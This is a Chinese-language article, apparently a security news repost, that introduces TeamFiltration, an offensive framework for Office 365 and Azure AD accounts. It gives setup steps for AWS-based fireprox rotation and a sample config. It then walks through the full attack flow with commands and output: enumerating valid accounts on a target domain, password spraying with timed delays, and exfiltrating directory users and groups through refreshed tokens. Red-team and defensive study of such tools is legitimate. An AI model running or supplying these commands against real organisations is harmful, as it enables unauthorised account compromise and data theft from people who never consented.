![](https://image.3001.net/images/20221122/1669116297_637cb1891e2ee34b1b88e.jpg!small)

## 关于TeamFiltration

TeamFiltration是一款针对O365 AAD账号安全的跨平台安全测试框架，在该工具的帮助下，广大研究人员可以轻松对O365
AAD账号进行枚举、喷射、过滤和后门植入等操作。TeamFiltering与CrackMapExec非常相似，它可以创建并维护一个磁盘数据库，其中包含的各种信息可以帮助研究人员跟踪过去和正在进行的操作。该数据库使用LiteDB构建，可以使用其开源LiteDB
Studio Windows工具在磁盘上手动浏览。

这个数据库中保存的信息包括有效的用户帐户、以前尝试的用户名和密码组合、有效的用户名和口令组合以及检索到的访问令牌等信息。

## 工具运行机制

![](https://image.3001.net/images/20221122/1669116322_637cb1a2401916bc0451f.png!small)![](https://image.3001.net/images/20221122/1669116329_637cb1a93f03bcfcbbcf6.png!small)

  

## 工具下载

广大研究人员可以访问该项目的【[
_Releases页面_](https://github.com/Flangvik/TeamFiltration/releases/latest)】直接下载Linux、Windows和macOS操作系统的预编译TeamFiltration版本。

![](https://image.3001.net/images/20221122/1669116339_637cb1b34026d7fa04497.png!small)

下载完成并解压文件后，将会得到一个单独的可执行应用程序，直接运行即可。

## 工具使用

### 创建你的JSON配置文件

先下载fireprox项目：

    
    
    git clone https://github.com/ustayready/fireprox
    
    cd fireprox

然后将[
_create_frieprox_instances.sh_](https://github.com/Flangvik/TeamFiltration/blob/main/create_fireprox_instances.sh)文件添加到该文件夹中。

填写你的AWS访问密钥并运行脚本后，Bash脚本将针对我们的配置信息输出JSON
FrieProx配置信息。下面给出的是一个示例TeamFiltration配置文件：

    
    
    {
    
        "pushoverAppKey": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    
        "pushoverUserKey": "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",
    
        "msolFireProxEndpointsUs": ["https://XXXXAAAA.execute-api.us-east-1.amazonaws.com/fireprox/common/oauth2/token","https://XXXXAAAA.execute-api.us-west-1.amazonaws.com/fireprox/common/oauth2/token"],
    
        "msolFireProxEndpoints": ["https://XXXXAAAA.execute-api.us-west-1.amazonaws.com/fireprox/common/oauth2/token","https://XXXXAAAA.execute-api.us-east-1.amazonaws.com/fireprox/common/oauth2/token"],
    
        "teamsEnumFireProxEndpoints": ["https://XXXXAAAA.execute-api.us-east-1.amazonaws.com/fireprox/","https://XXXXAAAA.execute-api.us-west-1.amazonaws.com/fireprox/"],
    
        "aadSSoFireProxEndpoints": ["https://XXXXAAAA.execute-api.us-east-1.amazonaws.com/fireprox","https://XXXXAAAA.execute-api.us-west-1.amazonaws.com/fireprox"],
    
        "sacrificialO365Username": "mr.andersen@matrix.com",
    
        "sacrificialO365Passwords": "TheChooenOne123!",
    
        "dehashedApiKey": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    
        "dehashedEmail" : "bruce.wayne@batcave.com",
    
        "proxyEndpoint": "http://127.0.0.1:8080"
    
      }

### 典型攻击流

下列命令可以开始账号枚举，--domain为目标客户端域名：

    
    
    TeamFiltration.exe --outpath C:\Clients\2021\Example\TFOutput --config myConfig.json --enum --validate-teams --domain legitcorp.net

TeamFiltration将要求你选择枚举的电子邮箱语句：

    
    
    [♥] TeamFiltration V0.3.2.6, created by @Flangvik
    
    [+] Args parsed --outpath F:\Clients\Example\TFOutput --config myConfig.json --enum --validate-teams --domain legitcorp.net
    
    [+] No usernames list provided, pulling statistically-likely-usernames
    
    [?] Provide a target domain/tenant (e.g legitcorp.net) #> legitcorp.net
    
        |=> [1] john.smith@legitcorp.net
    
        |=> [2] john@legitcorp.net
    
        |=> [3] johnjs@legitcorp.net
    
        |=> [4] johns@legitcorp.net
    
        |=> [5] johnsmith@legitcorp.net
    
        |=> [6] jsmith@legitcorp.net
    
        |=> [7] smith@legitcorp.net
    
        |=> [8] smithj@legitcorp.net
    
        |=> [9] john_smith@legitcorp.net
    
     
    
    [?] Select an email format #> 1

如果你想要提供自己的电子邮件列表，可以使用--username参数，输出结果会自动存储在TeamFiltration.db文件中：

    
    
    [ENUM] 24.05.2021 12:31:05 EST Filtering out previusly attempted accounts
    
    [ENUM] 24.05.2021 12:31:06 EST Enumerating 248231 possible accounts, this will take ~14 minutes
    
    [ENUM] 24.05.2021 12:31:07 EST Successfully got Teams token for sacrificial account
    
    [ENUM] 24.05.2021 12:31:07 EST Loaded 248231 usernames
    
    [ENUM] 24.05.2021 12:31:08 EST enita.lintz@legitcorp.net valid!
    
    [ENUM] 24.05.2021 12:31:09 EST bruce.wayne@legitcorp.net valid!
    
    [ENUM] 24.05.2021 12:31:13 EST herminia.oliva@legitcorp.net valid!
    
    [ENUM] 24.05.2021 12:31:13 EST thomas.anderson@legitcorp.net valid!
    
    [ENUM] 24.05.2021 12:31:17 EST sharilyn.penning@legitcorp.net valid!

接下来，我们就可以使用下列命令来进行有效邮箱地址喷射了：

    
    
    TeamFiltration.exe --outpath C:\Clients\2021\Example\TFOutput --config myConfig.json --spray --sleep-min 120 --sleep-max 200

如果没有提供密码列表，则TeamFiltration会自动生成一份密码列表：

    
    
    [♥] TeamFiltration V0.3.2.6, created by @Flangvik
    
    [+] Args parsed --outpath F:\Clients\Example\TFOutput --config myConfig.json --spray --sleep-min 120 --sleep-max 200
    
    [SPRAY] 24.05.2021 12:33:54 EST Sleeping between 60-100 minutes for each round
    
    [SPRAY] us-west-1 24.05.2021 12:33:55 EST Sprayed renita.lintz@legitcorp.net:Spring2021!          => INVALID
    
    [SPRAY] us-west-1 24.05.2021 12:33:55 EST Sprayed bruce.wayne@legitcorp.net:Spring2021!           => INVALID
    
    [SPRAY] us-west-1 24.05.2021 12:33:57 EST Sprayed herminia.oliva@legitcorp.net:Spring2021!        => INVALID
    
    [SPRAY] us-west-1 24.05.2021 12:33:57 EST Sprayed biff.tannen@legitcorp.net:Spring2021!           => INVALID
    
    [SPRAY] us-west-1 24.05.2021 12:33:58 EST Sprayed elijah.blakley@legitcorp.net:Spring2021!        => INVALID
    
    [SPRAY] us-west-1 24.05.2021 12:33:58 EST Sprayed thomas.anderson@legitcorp.net:Spring2021!       => VALID NO MFA!
    
    [SPRAY] us-west-1 24.05.2021 12:33:59 EST Sprayed chris.kelly@legitcorp.net:Spring2021!           => INVALID
    
    [SPRAY] us-west-1 24.05.2021 12:33:59 EST Sprayed deadpool@legitcorp.net:Spring2021!              => INVALID
    
    [SPRAY] us-west-1 24.05.2021 12:34:00 EST Sprayed sharilyn.penning@legitcorp.net:Spring2021!      => INVALID
    
    [SPRAY] us-west-1 24.05.2021 12:34:01 EST Sprayed master.kevin@legitcorp.net:Spring2021!          => INVALID
    
    [SPRAY] us-west-1 24.05.2021 12:34:01 EST Sprayed adam.wally@legitcorp.net:Spring2021!            => INVALID
    
    [SPRAY] 24.05.2021 12:34:01 EST Sleeping 78 before next spray

获取到有效凭证列表之后，我们就可以进行数据过滤了：

    
    
    TeamFiltration.exe --outpath C:\Clients\2021\Example\TFOutput --config myConfig.json --exfil --aad

进过数据过滤和提取之后，所有的用户信息都会添加到数据库文件中：

    
    
    [♥] TeamFiltration V0.3.2.6, created by @Flangvik
    
    [+] Args parsed --outpath F:\Clients\Example\TFOutput --config myConfig.json --exfil --aad
    
    [+] You can select multiple users using syntax 1,2,3 or 1-3
    
        |-> 0 - thomas.anderson@legitcorp.net
    
        |-> ALL - Everyone!
    
     
    
    [?] What user to target ? #> 0
    
    [EXFIL] 24.05.2021 12:35:43 EST Attempting to exfiltrate using provided token
    
    [EXFIL] 24.05.2021 12:35:44 EST Refreshed a token for => https://outlook.office365.com
    
    [EXFIL] 24.05.2021 12:35:45 EST Refreshed a token for => https://api.spaces.skype.com
    
    [EXFIL] 24.05.2021 12:35:45 EST Cross-resource-refresh allowed, we can exfil all that things!
    
    [EXFIL] 24.05.2021 12:35:53 EST Refreshed a token for => https://graph.windows.net
    
    [EXFIL] 24.05.2021 12:35:54 EST Refreshed a token for => https://graph.microsoft.com
    
    [EXFIL] 24.05.2021 12:35:54 EST Exfiltrating AAD users and groups via MS AD Graph API
    
    [EXFIL] 24.05.2021 12:35:58 EST Exfiltrating AAD users and groups via MS graph API
    
    [EXFIL] 24.05.2021 12:35:59 EST Got 133 AAD users, appending to database as valid users!

### 许可证协议

本项目的开发与发布遵循[ _GPL_
_-3.0_](https://github.com/Flangvik/TeamFiltration/blob/main/LICENSE)开源许可证协议。

## 项目地址

 **TeamFiltration** ：【[
_GitHub传送门_](https://github.com/Flangvik/TeamFiltration)】

## 参考资料

> [ _https://www.litedb.org/_](https://www.litedb.org/)
>
> [
> _https://github.com/mbdavid/LiteDB.Studio_](https://github.com/mbdavid/LiteDB.Studio)
>
> [
> _https://github.com/Flangvik/TeamFiltration/blob/main/create_fireprox_instances.sh_](https://github.com/Flangvik/TeamFiltration/blob/main/create_fireprox_instances.sh)

